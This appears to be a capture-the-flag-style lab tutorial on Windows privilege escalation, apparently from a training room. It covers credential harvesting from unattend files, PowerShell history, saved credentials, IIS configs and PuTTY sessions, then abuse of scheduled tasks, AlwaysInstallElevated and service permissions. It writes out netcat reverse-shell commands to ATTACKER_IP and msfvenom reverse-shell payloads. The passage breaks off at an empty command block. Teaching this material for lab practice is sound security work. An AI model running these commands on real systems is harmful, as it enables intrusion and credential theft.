  

Simply put, privilege escalation consists of using given access to a host with "user A" and leveraging it to gain access to "user B" by abusing a weakness in the target system. While we will usually want "user B" to have administrative rights, there might be situations where we'll need to escalate into other unprivileged accounts before actually getting administrative privileges.

  

Gaining access to different accounts can be as simple as finding credentials in text files or spreadsheets left unsecured by some careless user, but that won't always be the case. Depending on the situation, we might need to abuse some of the following weaknesses:

- Misconfigurations on Windows services or scheduled tasks
    
- Excessive privileges assigned to our account
    
- Vulnerable software
    
- Missing Windows security patches
    

Before jumping into the actual techniques, let's look at the different account types on a Windows system.

## Windows Users

Windows systems mainly have two kinds of users. Depending on their access levels, we can categorise a user in one of the following groups:

|   |   |
|---|---|
|||
|**Administrators**|These users have the most privileges. They can change any system configuration parameter and access any file in the system.|
|**Standard Users**|These users can access the computer but only perform limited tasks. Typically these users can not make permanent or essential changes to the system and are limited to their files.|

Any user with administrative privileges will be part of the **Administrators** group. On the other hand, standard users are part of the **Users** group.

  

In addition to that, you will usually hear about some special built-in accounts used by the operating system in the context of privilege escalation:


|   |   |
|---|---|
|**SYSTEM / LocalSystem**|An account used by the operating system to perform internal tasks. It has full access to all files and resources available on the host with even higher privileges than administrators.|
|**Local Service**|Default account used to run Windows services with "minimum" privileges. It will use anonymous connections over the network.|
|**Network Service**|Default account used to run Windows services with "minimum" privileges. It will use the computer credentials to authenticate through the network.|

These accounts are created and managed by Windows, and you won't be able to use them as other regular accounts. Still, in some situations, you may gain their privileges due to exploiting specific services.

**HARVESTING PASSWORD FROM USUAL SPOTS**

The easiest way to gain access to another user is to gather credentials from a compromised machine. Such credentials could exist for many reasons, including a careless user leaving them around in plaintext files; or even stored by some software like browsers or email clients

#### ** Unattended Windows Installations**

When installing Windows on a large number of hosts, administrators  may use Windows Deployment Services, which allows for a single operating  system image to be deployed to several hosts through the network. These  kinds of installations are referred to as unattended installations as  they don't require user interaction. Such installations require the use  of an administrator account to perform the initial setup, which might  end up being stored in the machine in the following locations:

- C:\Unattend.xml
    
- C:\Windows\Panther\Unattend.xml
    
- C:\Windows\Panther\Unattend\Unattend.xml
    
- C:\Windows\system32\sysprep.inf
    
- C:\Windows\system32\sysprep\sysprep.xml
    

  

  

### Powershell History

Whenever a user runs a command using Powershell, it gets stored into a  file that keeps a memory of past commands. This is useful for repeating  commands you have used before quickly. If a user runs a command that  includes a password directly as part of the Powershell command line, it  can later be retrieved by using the following command from a `cmd.exe` prompt:

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

**Note:** The command above will only work from cmd.exe, as Powershell won't recognize `%userprofile%` as an environment variable. To read the file from Powershell, you'd have to replace `%userprofile%` with `$Env:userprofile`. 


## Saved Windows Credentials

Windows allows us to use other users' credentials. This function also  gives the option to save these credentials on the system. The command  below will list saved credentials:

cmdkey /list

While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the `runas` command and the `/savecred` option, as seen below.

runas /savecred /user:admin cmd.exe

## IIS Configuration

Internet Information Services (IIS) is the default web server on  Windows installations. The configuration of websites on IIS is stored in  a file called `web.config` and can store passwords for  databases or configured authentication mechanisms. Depending on the  installed version of IIS, we can find web.config in one of the following  locations:

- C:\inetpub\wwwroot\web.config
    
- C:\Windows\[Microsoft.NET](http://Microsoft.NET)\Framework64\v4.0.30319\Config\web.config
    

Here is a quick way to find database connection strings on the file:

type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString

## Retrieve Credentials from Software: PuTTY

PuTTY is an SSH client commonly found on Windows systems. Instead of  having to specify a connection's parameters every single time, users can  store sessions where the IP, user and other configurations can be  stored for later use. While PuTTY won't allow users to store their SSH  password, it will store proxy configurations that include cleartext  authentication credentials.

To retrieve the stored proxy credentials, you can search under the  following registry key for ProxyPassword with the following command:

reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s

**Note:** Simon Tatham is the creator of PuTTY (and his name is  part of the path), not the username for which we are retrieving the  password. The stored proxy username should also be visible after running  the command above.

Just as putty stores credentials, any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.

OTHER OPTIONS MISCONFIGURATIONS

Privilege escalation is  not always a challenge. Some misconfigurations can allow you to obtain  higher privileged user access and, in some cases, even administrator  access. It would help if you considered these to belong more to the  realm of CTF events rather than scenarios you will encounter during real  penetration testing engagements. However, if none of the previously  mentioned methods works, you can always go back to these.

## Scheduled Tasks

Looking into scheduled tasks on the target system, you may see a  scheduled task that either lost its binary or it's using a binary you  can modify.

Scheduled tasks can be listed from the command line using the `schtasks` command  without any options. To retrieve detailed information about any of the  services, you can use a command like the following one:

            Command Prompt       

C:\> schtasks /query /tn vulntask /fo list /v

Folder: \

HostName: THM-PC1

TaskName: \vulntask

Task To Run: C:\tasks\schtask.bat

Run As User: taskusr1

You will get lots of information about the task, but what matters for  us is the "Task to Run" parameter which indicates what gets executed by  the scheduled task, and the "Run As User" parameter, which shows the  user that will be used to execute the task.

If our current user can modify or overwrite the "Task to Run"  executable, we can control what gets executed by the taskusr1 user,  resulting in a simple privilege escalation. To check the file  permissions on the executable, we use `icacls`:

            Command Prompt       

C:\> icacls c:\tasks\schtask.bat

c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)

BUILTIN\Administrators:(I)(F)

BUILTIN\Users:(I)(F)

As can be seen in the result, the **BUILTIN\Users**  group has full access (F) over the task's binary. This means we can  modify the .bat file and insert any payload we like. For your  convenience, `nc64.exe` can be found on `C:\tools`. Let's change the bat file to spawn a reverse shell:

            Command Prompt       

C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat

We then start a listener on the attacker machine on the same port we indicated on our reverse shell:

nc -lvp 4444

The next time the scheduled task runs, you should receive the reverse  shell with taskusr1 privileges. While you probably wouldn't be able to  start the task in a real scenario and would have to wait for the  scheduled task to trigger, we have provided your user with permissions  to start the task manually to save you some time. We can run the task  with the following command:

            Command Prompt       

C:\> schtasks /run /tn vulntask

And you will receive the reverse shell with taskusr1 privileges as expected:

            Kali Linux       

user@attackerpc$ nc -lvp 4444

Listening on 0.0.0.0 4444

Connection received on 10.10.175.90 50649

Microsoft Windows [Version 10.0.17763.1821]

(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami

wprivesc1\taskusr1

Go to taskusr1 desktop to retrieve a flag. Don't forget to input the flag at the end of this task.


## AlwaysInstallElevated

Windows installer files (also known as .msi files) are used to  install applications on the system. They usually run with the privilege  level of the user that starts it. However, these can be configured to  run with higher privileges from any user account (even unprivileged  ones). This could potentially allow us to generate a malicious MSI file  that would run with admin privileges.

**Note:** The AlwaysInstallElevated method won't work on this room's machine and it's included as information only.

This method requires two registry values to be set. You can query these from the command line using the commands below.

            Command Prompt       

C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer

C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

To be able to exploit this vulnerability, both should be set.  Otherwise, exploitation will not be possible. If these are set, you can  generate a malicious .msi file using `msfvenom`, as seen below:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.123.240 LPORT=LOCAL_PORT -f msi -o malicious.msi
```

As this is a reverse shell, you should also run the Metasploit  Handler module configured accordingly. Once you have transferred the  file you have created, you can run the installer with the command below  and receive the reverse shell:

            Command Prompt       

    C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi

## Windows Services

Windows services are managed by the **Service Control Manager**  (SCM). The SCM is a process in charge of managing the state of services  as needed, checking the current status of any given service and  generally providing a way to configure services.

Each service on a Windows machine will have an associated executable  which will be run by the SCM whenever a service is started. It is  important to note that service executables implement special functions  to be able to communicate with the SCM, and therefore not any executable  can be started as a service successfully. Each service also specifies  the user account under which the service will run.

To better understand the structure of a service, let's check the apphostsvc service configuration with the `sc qc` command:

Here we can see that the associated executable is specified through the **BINARY_PATH_NAME** parameter, and the account used to run the service is shown on the **SERVICE_START_NAME** parameter.

Services have a Discretionary Access Control List (DACL), which  indicates who has permission to start, stop, pause, query status, query  configuration, or reconfigure the service, amongst other privileges. The  DACL can be seen from Process Hacker (available on your machine's  desktop):
A subkey exists for every service in the system. Again, we can see the associated executable on the **ImagePath** value and the account used to start the service on the **ObjectName** value. If a DACL has been configured for the service, it will be stored in a subkey called **Security**. As you have guessed by now, only administrators can modify such registry entries by default.

  



## Insecure Service Permissions

You might still have a slight chance of taking advantage of a service  if the service's executable DACL is well configured, and the service's  binary path is rightly quoted. Should the service DACL (not the  service's executable DACL) allow you to modify the configuration of a  service, you will be able to reconfigure the service. This will allow  you to point to any executable you need and run it with any account you  prefer, including SYSTEM itself.

To check for a service DACL from the command line, you can use [Accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals suite. For your convenience, a copy is available at `C:\\tools`. The command to check for the thmservice service DACL is:

Here we can see that the `BUILTIN\\Users` group has the SERVICE_ALL_ACCESS permission, which means any user can reconfigure the service.

Before changing the service, let's build another exe-service reverse  shell and start a listener for it on the attacker's machine:

```
user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe
```


    user@attackerpc$ nc -lvp 4447

```
C:\> icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
```

To change the service's associated executable and account, we can use  the following command (mind the spaces after the equal signs when using  sc.exe):

            Command Prompt       



